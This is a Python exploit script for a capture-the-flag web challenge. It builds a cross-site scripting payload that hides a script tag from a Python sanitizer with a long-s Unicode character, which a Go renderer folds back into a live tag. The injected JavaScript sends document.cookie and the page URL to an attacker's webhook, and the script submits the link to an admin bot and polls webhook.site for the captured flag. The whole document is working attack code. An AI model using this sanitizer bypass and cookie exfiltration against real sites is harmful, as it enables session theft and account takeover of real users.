#!/usr/bin/env python3

import argparse
import re
import sys
import time
from html import unescape
from urllib.parse import quote_plus, urlparse

import requests

DEFAULT_CHALLENGE_URL = "https://demolition.breakable.live/"
DEFAULT_BOT_URL = "https://demolition-bot.breakable.live/"


def build_payload(webhook: str) -> str:
    js = (
        "(()=>{"
        f"const U={webhook!r};"
        "const C=encodeURIComponent(document.cookie||'');"
        "const L=encodeURIComponent(location.href||'');"
        "const Q='?c='+C+'&u='+L+'&t='+Date.now();"
        "try{navigator.sendBeacon(U,'c='+C+'&u='+L)}catch(e){}"
        "try{fetch(U+Q,{mode:'no-cors',credentials:'omit'})}catch(e){}"
        "(new Image).src=U+Q;"
        "})();"
    )
    # Use long-s so Python misses the tag and Go folds it back to <script>.
    return f"<ſcript>{js}</ſcript>"


def build_exploit_url(challenge_url: str, webhook: str) -> str:
    base = challenge_url.rstrip("/") + "/"
    draft = quote_plus(build_payload(webhook))
    return f"{base}?p=render.engine%3Dgo&d={draft}"


def token_from_webhook(webhook: str) -> str | None:
    parsed = urlparse(webhook)
    token = parsed.path.strip("/")
    if re.fullmatch(r"[0-9a-fA-F-]{36}", token):
        return token
    return None


def get_latest_request(token: str, timeout: int = 15) -> dict | None:
    url = f"https://webhook.site/token/{token}/request/latest"
    try:
        resp = requests.get(url, headers={"Accept": "application/json"}, timeout=timeout)
    except requests.RequestException:
        return None
    if resp.status_code != 200:
        return None
    try:
        return resp.json()
    except ValueError:
        return None


def extract_flag(obj) -> str | None:
    patterns = [r"FLAG=CTF\{[^}]+\}", r"CTF\{[0-9a-fA-F]{64}\}", r"CTF\{[^}]+\}"]

    def walk(value):
        if isinstance(value, dict):
            for key, item in value.items():
                yield str(key)
                yield from walk(item)
        elif isinstance(value, list):
            for item in value:
                yield from walk(item)
        else:
            yield str(value)

    for raw in walk(obj):
        for candidate in {raw, unescape(raw)}:
            for pattern in patterns:
                match = re.search(pattern, candidate)
                if not match:
                    continue
                value = match.group(0)
                if value.startswith("FLAG="):
                    value = value.split("FLAG=", 1)[1]
                return value
    return None


def try_submit(bot_url: str, exploit_url: str, timeout: int = 20) -> bool:
    session = requests.Session()
    attempts = [
        ("POST", bot_url.rstrip("/") + "/send", {"data": {"url": exploit_url}}),
        ("POST", bot_url.rstrip("/") + "/", {"data": {"url": exploit_url}}),
        ("POST", bot_url.rstrip("/") + "/send", {"json": {"url": exploit_url}}),
        ("POST", bot_url.rstrip("/") + "/", {"json": {"url": exploit_url}}),
        ("POST", bot_url.rstrip("/") + "/send", {"data": {"link": exploit_url}}),
        ("POST", bot_url.rstrip("/") + "/send", {"data": {"path": exploit_url}}),
    ]

    for method, url, kwargs in attempts:
        try:
            resp = session.request(method, url, timeout=timeout, allow_redirects=True, **kwargs)
        except requests.RequestException as exc:
            print(f"[-] {method} {url} failed: {exc}")
            continue

        body = resp.text[:300].replace("\n", " ")
        print(f"[+] Tried {method} {url} -> HTTP {resp.status_code}")
        if body:
            print(f"    {body}")

        if resp.status_code < 500 and any(
            marker in resp.text.lower()
            for marker in ("queued", "submitted", "sent", "visit", "job", "ok", "success")
        ):
            return True

    return False


def poll_for_flag(webhook: str, old_uuid: str | None, timeout_secs: int, interval: float) -> str | None:
    token = token_from_webhook(webhook)
    if not token:
        return None

    deadline = time.time() + timeout_secs
    while time.time() < deadline:
        latest = get_latest_request(token)
        if latest:
            uuid = latest.get("uuid")
            if uuid and uuid != old_uuid:
                flag = extract_flag(latest)
                if flag:
                    return flag
                old_uuid = uuid
        time.sleep(interval)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Remote exploit helper for demolition")
    parser.add_argument("--webhook", required=True, help="Webhook collector, ideally https://webhook.site/<uuid>")
    parser.add_argument("--challenge", default=DEFAULT_CHALLENGE_URL)
    parser.add_argument("--bot", default=DEFAULT_BOT_URL)
    parser.add_argument("--submit", action="store_true", help="Try common bot submission endpoints")
    parser.add_argument("--timeout", type=int, default=60, help="Webhook polling timeout in seconds")
    parser.add_argument("--interval", type=float, default=2.0, help="Webhook polling interval")
    args = parser.parse_args()

    exploit_url = build_exploit_url(args.challenge, args.webhook)
    print("[+] Exploit URL:\n")
    print(exploit_url)
    print()
    print("[+] Manual steps:")
    print("    1) Submit the exploit URL to the admin bot.")
    print("    2) Wait for the bot to visit the same-origin payload.")
    print("    3) Read FLAG=CTF{...} from your webhook collector.")

    token = token_from_webhook(args.webhook)
    latest = get_latest_request(token) if token else None
    old_uuid = latest.get("uuid") if latest else None

    if not args.submit:
        return 0

    print()
    if try_submit(args.bot, exploit_url):
        print("[+] Bot submission looks successful.")
    else:
        print("[!] Could not confirm bot submission automatically.")

    if not token:
        print("[!] Webhook polling only works automatically for webhook.site UUID URLs.")
        return 0

    print(f"[+] Polling webhook.site for up to {args.timeout}s...")
    flag = poll_for_flag(args.webhook, old_uuid, args.timeout, args.interval)
    if flag:
        print(f"[+] FLAG: {flag}")
        return 0

    print("[-] No new flag hit was captured in time.")
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        sys.exit(130)
